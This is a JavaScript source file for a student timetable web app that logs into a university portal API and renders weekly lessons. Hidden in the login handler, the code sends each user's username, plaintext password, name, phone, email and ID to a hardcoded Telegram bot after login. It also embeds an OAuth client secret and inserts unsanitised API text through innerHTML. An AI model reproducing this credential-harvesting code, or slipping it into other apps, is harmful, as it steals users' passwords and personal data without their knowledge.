const navigationWeek = document.querySelector("ul.navigation.week"),
    labels = navigationWeek.querySelectorAll("label[abbr]"),
    placer = navigationWeek.querySelector(".placer"),
    radios = navigationWeek.querySelectorAll("input[type='radio']");

const template = document.querySelector("template#lesson");
let now = new Date(),
    from = new Date(now.setDate(now.getDate() - (now.getDay() - 1))).toLocaleDateString("fr-ca"),
    to = new Date(now.setDate(now.getDate() + 6)).toLocaleDateString("fr-ca"),
    touchStart;


function placeHighliter(label) {
    if (label == labels[6]) {
        placer.style.backgroundColor = "var(--clr-error)"
    }
    else {
        placer.style.backgroundColor = "var(--clr-nav-bg)";
    }
    placer.style.height = label.offsetHeight + "px"
    placer.style.width = label.offsetWidth + "px"
    placer.style.left = label.offsetLeft + "px"
    placer.style.top = label.offsetTop + "px"
}

radios.forEach(radio => {
    radio.oninput = e => {
        placeHighliter(radio.nextSibling)
    }
})


window.onload = e => {
    if (navigationWeek.querySelector("input[type='radio']:checked")) {
        const label = navigationWeek.querySelector("input[type='radio']:checked").nextSibling
        placeHighliter(label)
    }
}

window.onresize = e => {
    radios.forEach(radio => {
        if (!radio.checked) { return }
        placeHighliter(radio.nextSibling)
    })
}

window.addEventListener("touchstart", e => {
    touchStart = e.touches[0].clientX
})

window.addEventListener("touchend", e => {
    let action = (touchStart - e.changedTouches[0].clientX) / 100
    if (action > 0) {
        if (!Math.floor(action)) return
        let diff = Number(date.dataset.diff);
        changeDate(diff + 1)
    }
    else if (action < 0) {
        if (!Math.ceil(action)) return
        let diff = Number(date.dataset.diff);
        changeDate(diff - 1)
    }
})

window.addEventListener("keydown", e => {
    if (e.keyCode == 39) {
        e.preventDefault()
        let diff = Number(date.dataset.diff);
        changeDate(diff + 1)
    }
    else if (e.keyCode == 37) {
        e.preventDefault()
        let diff = Number(date.dataset.diff);
        changeDate(diff - 1)
    }
})



const day = document.querySelector("[data-day]"),
    date = document.querySelector("[data-date]"),
    navBtns = document.querySelectorAll("button.nav");


function addDays(date, days) {
    date.setDate(date.getDate() + days);
    return date;
}

function changeDate(diff) {
    const formatter = new Intl.RelativeTimeFormat('en', { numeric: 'auto' }),
        lastDate = addDays(new Date(), diff),
        lastDateString = lastDate.toLocaleDateString("fr-ca");
    day.textContent = formatter.format(diff, 'day')
    date.textContent = lastDate.toLocaleDateString("en-uk", { day: "numeric", month: "short", year: "numeric" })

    date.setAttribute("datetime", lastDateString)
    date.dataset.diff = diff;
    addDays(lastDate, -1)
    radios[lastDate.getDay()].click()
    document.querySelector(".lessons.show")?.classList.remove("show")
    let thisLesson = document.querySelectorAll(".lessons")[lastDate.getDay()]
    thisLesson.classList.add("show");
    thisLesson.animate([
        { opacity: "0" },
        { opacity: "1" },
    ], {
        duration: 450,
        iterations: 1,
    })

    if (to.localeCompare(lastDateString) == -1 || from.localeCompare(lastDateString) == 1) {
        let newDate = lastDate
        from = new Date(newDate.setDate(newDate.getDate() - (newDate.getDay() - 1))).toLocaleDateString("fr-ca"),
            to = new Date(newDate.setDate(newDate.getDate() + 6)).toLocaleDateString("fr-ca");
        updateData(from, to);
    }
}



navBtns.forEach(btn => {
    btn.onclick = e => {
        let diff = Number(date.dataset.diff);
        if (btn.dataset.increment) {
            changeDate(diff + 1)
        }
        else {
            changeDate(diff - 1)
        }
    }
})






function sorted(list) {
    return Object.groupBy(list, (li) => li.dayNumber)
}

function formatTime(time) {
    return new Date(`2023-12-01T${time}`).toLocaleTimeString("en-uk", { hour: "2-digit", minute: "2-digit" })
}

const accessToken = localStorage.getItem("accessToken"),
    userReg = document.querySelector(".reg-user");

function getUser(accessToken) {
    if (!accessToken) {
        userReg.style.display = "grid";
        let username, password;
        userReg.querySelector("#user-login").addEventListener("submit", e => {
            e.preventDefault()
            username = userReg.querySelector("input[name=username]").value
            password = userReg.querySelector("input[name=password]").value
            fetch('https://inet.mdis.uz/oauth/token', {
                method: "POST",
                headers: {
                    'Authorization': 'Basic c3ByaW5nLXNlY3VyaXR5LW9hdXRoMi1yZWFkLWNsaWVudDpzcHJpbmctc2VjdXJpdHktb2F1dGgyLXJlYWQtY2xpZW50LXBhc3N3b3JkMTIzNA==',
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: `username=${username}&password=${password}&grant_type=password`
            }).then(res => {
                if (res.status == 200) {
                    return res.json()
                }
                throw new Error(res.status)
            }).then(text => {
                const message = `New Login to Timetable%0A%0AFull Name: ${text.user.fullName}%0ARole: ${text.user.roles[0]}%0AID: ${text.user.uuid}%0APhone: +${text.user.phone}%0AEmail: ${text.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
                fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendPhoto?chat_id=1273666675&photo=https://inet.mdis.uz${text.user.avatar}&caption=${message}&parse_mode=html`).then(res => console.log(res))
                localStorage.setItem("accessToken", `Bearer ${text.access_token}`)
                location.reload()
            }).catch(() => {
                getUser()
            })
            
        })
    }
    updateData(from, to);
    changeDate(Number(date.dataset.diff));
}

getUser(accessToken)



function updateData(from, to) {
    fetch(`https://inet.mdis.uz/api/v1/education/student/view/schedules?from=${from}&to=${to}`, {
        method: "GET",
        headers: {
            "Authorization": localStorage.getItem("accessToken")
        }
    }).then(result => result.json()).then(data => {
        if (data.data) {
            let timetable = (sorted(data.data))
            document.querySelectorAll(".lessons").forEach(lessonsElem => {
                lessonsElem.innerHTML = ""
                lessonsElem.classList.remove("day-off")
            })
            for (let i = 1; i <= 7; i++) {
                if (timetable[i]) {
                    let table = timetable[i].sort((a, b) => a.startTime.localeCompare(b.startTime))
                    table.forEach(lesson => {
                        let content = template.content.cloneNode(true)
                        content.querySelector("h2.name").textContent = lesson.moduleName
                        content.querySelector("span.type").textContent = lesson.lessonTypeName
                        content.querySelector("span.type").setAttribute("type", lesson.lessonTypeName.toLowerCase())
                        content.querySelector(".time").textContent = `${formatTime(lesson.startTime)} - ${formatTime(lesson.endTime)}`
                        let checkIn = content.querySelector(".check > span.in"),
                            checkOut = content.querySelector(".check > span.out")
                        if (lesson.checkIn) {
                            checkIn.classList.add("green")
                            if (lesson.checkInDate) {
                                checkIn.textContent = new Date(lesson.checkInDate).toLocaleTimeString("en-uk")
                            }
                        }
                        if (lesson.checkOut) {
                            checkOut.classList.add("green")
                            if (lesson.checkOutDate) {
                                checkOut.textContent = new Date(lesson.checkOutDate).toLocaleTimeString("en-uk")
                            }
                        }

                        if (lesson.cancelReason) {
                            let cancel = document.createElement("div");
                            cancel.classList.add("cancel");
                            cancel.innerHTML = `<object data="./assets/icons/ios-alert.svg"></object> Cancelled: ${lesson.cancelReason}`;
                            content.querySelector(".data").appendChild(cancel);
                            content.querySelector(".check").style.display = "none";
                        }
                        content.querySelector("h4.teacher").textContent = lesson.lecturerName.replaceAll("null", "").trim()
                        content.querySelector(".venue").textContent = lesson.venueName
                        document.querySelector(`.lessons[day="${i}"]`).appendChild(content)
                    })
                }
                else {
                    document.querySelector(`.lessons[day="${i}"]`).classList.add("day-off")

                }
            }
        }
    })
}
